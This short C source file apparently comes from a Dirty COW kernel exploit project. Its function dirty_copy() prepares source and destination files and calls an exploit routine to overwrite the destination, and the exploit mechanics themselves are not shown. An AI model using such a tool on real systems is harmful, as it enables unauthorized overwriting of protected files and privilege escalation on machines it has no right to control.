//
// Created by k.leyfer on 22.06.2017.
//

#include "file_utils.h"
#include "dirty_copy.h"
#include "../common/logging.h"

int dirty_copy(const char* src_path, const char* dst_path)
{
  struct mem_arg mem_arg;
  if (prepare_dirty_copy(src_path, dst_path, &mem_arg) == -1)
  {
    LOGV("Unable to prepare files!");
    return -1;
  }

  exploit(&mem_arg);

  if (mem_arg.success == 0)
  {
    return -1;
  }

  return 0;
}
